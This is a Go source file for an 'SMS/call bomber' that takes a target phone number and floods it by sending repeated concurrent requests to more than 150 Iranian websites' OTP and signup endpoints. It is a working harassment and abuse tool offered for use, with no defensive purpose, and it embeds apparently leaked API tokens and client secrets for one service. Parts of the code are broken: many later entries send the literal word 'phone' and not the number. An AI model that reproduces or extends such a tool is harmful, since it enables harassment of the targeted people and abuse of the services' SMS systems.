//⚠️⚠️in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️
//⚠️⚠️ in kodi hast ke kole api hayi ke vojod dasht az ghablan ke dar sms.go bod ro be inja montaghel kardam. havaset basheh.⚠️⚠️

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"
)

/* import: 	net/url  strings
===============================================
Link Github : https://github.com/monsmain    
===============================================
Sms Bomber faster
*/
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}
func sms(url string, headers map[string]interface{}, ch chan<- int) {
	jsonData, err := json.Marshal(headers)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while encoding JSON!\033[0m")
		ch <- http.StatusInternalServerError
		return
	}

	time.Sleep(3 * time.Second)

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
	time.Sleep(3 * time.Second)

	if err != nil {
		fmt.Println("\033[01;31m[-] Error while sending request!\033[0m")
		ch <- http.StatusInternalServerError
		return
	}
	defer resp.Body.Close()

	ch <- resp.StatusCode
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m") // Top (green)
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m") // Middle (white)
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-  faster    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m") // Bottom (red)
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m") // Reset color

	var phone string
	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m200 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	ch := make(chan int)

	for i := 0; i < repeatCount; i++ {
/////////////////////////////////////// site aparat should definitely be added.
		
                go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
			"identifier": phone,
		}, ch)   // add site
		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
			"'method': 'phone', 'identifier'": phone,
		}, ch)
		go sms("https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{
			"username": phone,
		}, ch)   // add site
		go sms("https://ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{
			"msisdn": phone,
		}, ch)  
		go sms("https://account.api.balad.ir/api/web/auth/login/", map[string]interface{}{
			"phone_number": phone,
		}, ch)  
		go sms("https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", map[string]interface{}{
			"username": phone,
		}, ch) // add site
		go sms("https://gamefa.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"digits_phone": phone,
		}, ch)  // add site
		go sms("https://app.mediana.ir/api/account/AccountApi/CreateOTPWithPhone", map[string]interface{}{
			"phone": phone,
		}, ch)  // add site
		go sms("https://www.anbaronline.ir/account/sendotpjson", map[string]interface{}{
			"mobile": phone,
		}, ch) //add site  /catcha site
		go sms("https://appapi.sms.ir/api/app/auth/sign-up/verification-code", map[string]interface{}{
			"": phone,
		}, ch)  // add site
		go sms("https://api.torob.com/v4/user/phone/send-pin/?phone_number=phone&source=next_desktop", map[string]interface{}{
			"phone_number": phone,
		}, ch)   // add site   moshkel dareh❌❌❌ hamchenin in site neshan.org & technolife.com
 		go sms("https://app.ezpay.ir:8443/open/v1/user/validation-code", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)  // add site
		go sms("https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)   // add site
		go sms("https://api.achareh.co/v2/accounts/login/?web=true", map[string]interface{}{
			"phone": phone,
		}, ch)   // add site
		go sms("https://www.filimo.com/api/fa/v1/user/Authenticate/signup_step1", map[string]interface{}{
			"account": phone,
		}, ch)   // add site
		go sms("https://nazarkade.com/wp-content/plugins/Archive//api/check.mobile.php", map[string]interface{}{
			"mobile": phone,
		}, ch)  // add site
		go sms("https://nazarkade.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"mobileNo": phone,
		}, ch)  // add site
		go sms("https://api.motabare.ir/v1/core/user/initial/", map[string]interface{}{
			"mobile": phone,
		}, ch)   // add site = chaptcha
		go sms("https://api.baloan.ir/api/v1/accounts/login-otp", map[string]interface{}{
			"phone_number": phone,
		}, ch)   // add site = juft login
		go sms("https://api.mydigipay.com/digipay/api/users/send-sms", map[string]interface{}{
			"cellNumber": phone,
		}, ch)  // add site
		go sms("https://www.e-estekhdam.com/panel/users/authenticate/start?redirect=/search", map[string]interface{}{
			"username": phone,
		}, ch)  // add site
		go sms("https://emp.e-estekhdam.com/users/authenticate/start?redirect=/", map[string]interface{}{
			"username": phone,
		}, ch)  // add site
		go sms("https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)   // add site
		go sms("https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
			"CellPhone": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://oteacher.org/api/user/register/mobile", map[string]interface{}{
			"mobile": phone,
		}, ch)    // add site = captcha
		go sms("https://www.buskool.com/send_verification_code", map[string]interface{}{
			"phone": phone,
		}, ch)   // add site
		go sms("https://kilid.com/api/uaa/portal/auth/v1/otp?captchaId=akah8cgoLOvIfKnE1mx3lXOB4NrXJ0LWIXim8TTe4EETy7EKGJgAtjkFzcfF6M33i2IK8aqmJrg1X1nc59osFA%253D%253D", map[string]interface{}{
			"": phone,
		}, ch)   // add site
		go sms("https://roustaee.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"mobileNo": phone,
		}, ch)   // add site
		go sms("https://dr-ross.ir/users/CheckRegisterMobile?returnUrl=%2F", map[string]interface{}{
			"mobile": phone,
		}, ch)   // add site
		go sms("https://api.epasazh.com/api/v4/blind-otp", map[string]interface{}{
			"mobile": phone,
		}, ch)   // add site
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// github account:
// number 1
		go sms("https://nobat.ir/api/public/patient/login/phone", map[string]interface{}{
			"------WebKitFormBoundary5wscOwxMqnICoiZY\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n": phone,
		}, ch)   // add site
		go sms("https://www.digistyle.com/users/login-register/", map[string]interface{}{
			"loginRegister%5Bemail_phone%5D=": phone,
		}, ch)   // add site
		go sms("https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=52f02dbc&optionalVersion=5.6.6&UDID=fb000c1a-41a6-4059-8e22-7fb820e6942b", map[string]interface{}{
			"cellphone=": phone,
		}, ch)   // add site
		go sms("https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)   // add site
		go sms("https://drdr.ir/api/v3/auth/login/mobile/init", map[string]interface{}{
			"mobile": phone,
		}, ch)    // add site
		go sms("https://gw.taaghche.com/v4/site/auth/login", map[string]interface{}{
			"contact": phone,
		}, ch)    // add site
		go sms("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
			"contact": phone,
		}, ch)    // add site
		go sms("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
			"MobileNumber": phone,
		}, ch)    // add site
		go sms("https://api.vandar.io/account/v1/check/mobile", map[string]interface{}{
			"mobile": phone,
		}, ch)    // add site
		go sms("https://api.mobit.ir/api/web/v8/register/register", map[string]interface{}{
			"number": phone,
		}, ch)    // add site
		go sms("https://api.pinorest.com/frontend/auth/login/mobile", map[string]interface{}{
			"mobile": phone,
		}, ch)    // add site
		go sms("https://takshopaccessorise.ir/api/v1/sessions/login_request", map[string]interface{}{
			"mobile_phone": phone,
		}, ch)    // add site
//number2:
		go sms("https://api.lendo.ir/api/customer/auth/send-otp", map[string]interface{}{
			"mobile": phone,
		}, ch)    // add site
		go sms("https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{
			"mobile": phone,
		}, ch)    // add site
		go sms("https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", map[string]interface{}{
			"phone": phone,
		}, ch)    // add site
		go sms("https://hamrahsport.com/send-otp", map[string]interface{}{
			"cell": phone,
		}, ch)    // add site
		go sms("https://harikashop.com/login?back=my-account", map[string]interface{}{
			"username": phone,
		}, ch)    // add site
		go sms("https://www.zzzagros.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"username": phone,
		}, ch)    // add site
		go sms("https://arastag.ir/wp-admin/admin-ajax.php", map[string]interface{}{
			"mobileemail": phone,
		}, ch)    // add site
		go sms("https://www.tamimpishro.com/site/api/v1/user/otp", map[string]interface{}{
			"mobile": phone,
		}, ch)    // add site
		go sms("https://api2.fafait.net/oauth/check-user", map[string]interface{}{
			"id": phone,
		}, ch)    // add site
		go sms("https://fankala.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"mobileNo": phone,
		}, ch)    // add site
		go sms("https://www.khanoumi.com/accounts/sendotp", map[string]interface{}{
			"mobile": phone,
		}, ch)  
		go sms("https://filmnet.ir/api-v2/access-token/users/0{phone}/otp", map[string]interface{}{
			"otp:login": phone,
		}, ch)  
		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{
			"UserName": phone,
		}, ch) 
		go sms("https://api-react.okala.com/C/CustomerAccount/OTPRegister", map[string]interface{}{
			"mobile": phone,
		}, ch)  
//number3:
		go sms("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", map[string]interface{}{
			"cellphone": phone,
		}, ch)  
		go sms("https://sabziman.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"phonenumber": phone,
		}, ch)  

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
				s2 := fmt.Sprintf("'userKey':'98-'%s ,'userKeyType': 1", phone)
		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
			s2: phone,
		}, ch)
                go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
			"userKey": phone,
		}, ch)   // just check
		go sms("https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", map[string]interface{}{
			"phone": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)  // edit :4/22/2025
		s57 := fmt.Sprintf("phone=%s&call=yes", phone)
		go sms("https://novinbook.com/index.php?route=account/phone", map[string]interface{}{
			s57: phone,
		}, ch) // verify site: i'm not robot
		go sms("https://api.pooleno.ir/v1/auth/check-mobile", map[string]interface{}{
			"mobile": phone,
		}, ch)  // delete site: no Access
		go sms("https://agent.wide-app.ir/auth/token", map[string]interface{}{
			"'grant_type': 'otp', 'client_id': '62b30c4af53e3b0cf100a4a0', 'phone'": phone,
		}, ch) // error site: secure connection
		go sms("https://api.zarinplus.com/user/otp/", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)  // edit & Alternative :4/22/2025
		se := fmt.Sprintf("'api_version': '3', 'method': 'sendCode', 'data': {'phone_number': %s, 'send_type': 'SMS'}", phone)
		go sms("https://messengerg2c4.iranlms.ir/", map[string]interface{}{
			se: phone,
		}, ch)  // idon't know ???
 		go sms("https://lms.tamland.ir/api/api/user/signup", map[string]interface{}{
			"mobile": phone,
		}, ch)    // add site
		go sms("https://account.bama.ir/api/otp/generate/v4", map[string]interface{}{
			"username": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://api.bitbarg.com/api/v1/authentication/registerOrLogin", map[string]interface{}{
			"phone": phone,
		}, ch)  // delete site: no Access
		go sms("https://api.bahramshop.ir/api/user/validate/username", map[string]interface{}{
			"username": phone,
		}, ch)  // error site: secure connection
		go sms("https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{
			"phone=": phone,
		}, ch)  //Password required
		go sms("https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
			"mobile": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
			"null, Username": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
			"mobile": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://dicardo.com/sendotp", map[string]interface{}{
			"phone": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://ghasedak24.com/user/otp", map[string]interface{}{
			"mobile": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://ketabchi.com/api/v1/auth/requestVerificationCodee", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://www.offdecor.com/index.php?route=account/login/sendCode", map[string]interface{}{
			"phone": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://shahrfarsh.com/Account/Login", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://takfarsh.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"username": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://accounts.khanoumi.com/account/login/init", map[string]interface{}{
			"loginIdentifier": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://api.rokla.ir/user/request/otp/", map[string]interface{}{
			"mobile": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://mashinbank.com/api2/users/check", map[string]interface{}{
			"mobileNumber": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://client.api.paklean.com/download", map[string]interface{}{
			"tel": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://beta.raghamapp.com/auth", map[string]interface{}{
			"phone": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email", map[string]interface{}{
			"phoneNumber": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://api.timcheh.com/auth/otp/send", map[string]interface{}{
			"mobile": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://mobogift.com/signin", map[string]interface{}{
			"username": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://cinematicket.org/api/v1/users/otp", map[string]interface{}{
			"phone_number": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://cinematicket.org/api/v1/users/signup", map[string]interface{}{
			"phone_number": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://kafegheymat.com/shop/getLoginSms", map[string]interface{}{
			"phone": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://www.delino.com/user/register", map[string]interface{}{
			"mobile": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://restaurant.delino.com/user/register", map[string]interface{}{
			"'apiToken':'VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq','clientSecret':'7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq','device':'web','username'": phone,
		}, ch)
		go sms("https://1401api.tamland.ir/api/user/signup", map[string]interface{}{
			"Mobile": phone,
		}, ch)
		go sms("https://melix.shop/site/api/v1/user/validate", map[string]interface{}{
			"mobile": phone,
		}, ch)    // edit :4/22/2025
		go sms("https://api6.arshiyaniha.com/api/v2/client/otp/send", map[string]interface{}{
			"'country_code':'98','cellphone'": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://api.ehteraman.com/api/request/otp", map[string]interface{}{
			"mobile": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://refahtea.ir/wp-admin/admin-ajax.php", map[string]interface{}{
			"mobile": phone,
		}, ch)   // edit :4/22/2025
		go sms("https://mamifood.org/Registration.aspx/SendValidationCode", map[string]interface{}{
			"Phone": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://mamifood.org/Registration.aspx/IsUserAvailable", map[string]interface{}{
			"cellphone": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://www.glite.ir/wp-admin/admin-ajax.php", map[string]interface{}{
			"mobileemail": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://www.offch.com/login", map[string]interface{}{
			"1_username": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{
			"mobile": phone,
		}, ch)  // edit :4/22/2025
		go sms("https://backend.digify.shop/user/merchant/otp/", map[string]interface{}{
			"phone_number": phone,
		}, ch)  // edit :4/22/2025
		go sms(fmt.Sprintf("https://auth.mrbilit.ir/api/Token/send?mobile=", phone), map[string]interface{}{
			"mobile": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://platform-api.snapptrip.com/profile/auth/request-otp", map[string]interface{}{
			"phoneNumber": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://api.bitpin.org/v3/usr/authenticate/", map[string]interface{}{
			"phone": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://www.chamedoun.com/auth/sms/send-login-otp", map[string]interface{}{
			"phone": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://core.gap.im/v1/user/sendOTP.gap", map[string]interface{}{
			"mobile­": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://gateway.wisgoon.com/api/v1/auth/login/", map[string]interface{}{
			"phone": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://tagmond.com/phone_number", map[string]interface{}{
			"phone_number": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{
			"mobile­": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://pakhsh.shop/wp-admin/admin-ajax.php", map[string]interface{}{
			"phone": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://see5.net/phonenumberHandler.php", map[string]interface{}{
			"phone": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://see5.net/wp-content/themes/see5/webservice_demo2.php", map[string]interface{}{
			"mobile": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://simkhanapi.ir/api/users/registerV2", map[string]interface{}{
			"mobileNumber": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://my.limoome.com/api/auth/login/otp", map[string]interface{}{
			"mobileNumber": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://www.mihanpezeshk.com/Verification_Patients", map[string]interface{}{
			"mobile": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://www.mihanpezeshk.com/ConfirmCodeSbm_Doctor", map[string]interface{}{
			"mobile": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://behzadshami.com/login_register?type=register", map[string]interface{}{
			"regMobile": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://shop.tnovin.com/login", map[string]interface{}{
			"phone": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://moshaveran724.ir/m/uservalidate.php", map[string]interface{}{
			"number": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://moshaveran724.ir/m/pms.php", map[string]interface{}{
			"number": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://ashraafi.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"phone_number": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://bazidone.com/wp-admin/admin-ajax.php", map[string]interface{}{
			"digits_phone": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://www.bigtoys.ir/wp-admin/admin-ajax.php", map[string]interface{}{
			"phone": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://bitex24.com/api/v1/auth/sendSms2", map[string]interface{}{
			"mobile": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://livarfars.ir/wp-admin/admin-ajax.php", map[string]interface{}{
			"phone": "phone",
		}, ch)  // edit :4/22/2025
		go sms("https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister", map[string]interface{}{
			"mobile": "phone",
		}, ch)  // edit :4/22/2025

	}

	for i := 0; i < repeatCount*207; i++ {
		statusCode := <-ch
		if statusCode == 404 || statusCode == 400 {
			fmt.Println("\033[01;31m[-] Error ! ")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}

	}
}
